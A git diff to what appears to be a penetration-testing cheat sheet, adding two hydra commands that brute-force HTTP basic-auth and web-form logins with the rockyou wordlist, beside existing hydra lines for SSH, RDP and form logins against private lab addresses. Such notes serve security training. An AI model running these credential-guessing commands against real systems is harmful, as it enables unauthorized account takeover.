@@ -458,7 +458,9 @@ get-domainuser -spn -credential $Cred
 # hydra
 hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337" rdp://192.168.50.202
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.172.61 http-get /login
 hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:usr=user&pwd=^PASS^:F=Login failed"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.172.61 -s 8081 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:F=403'
 ```
 ## hashcrack
 ```bash
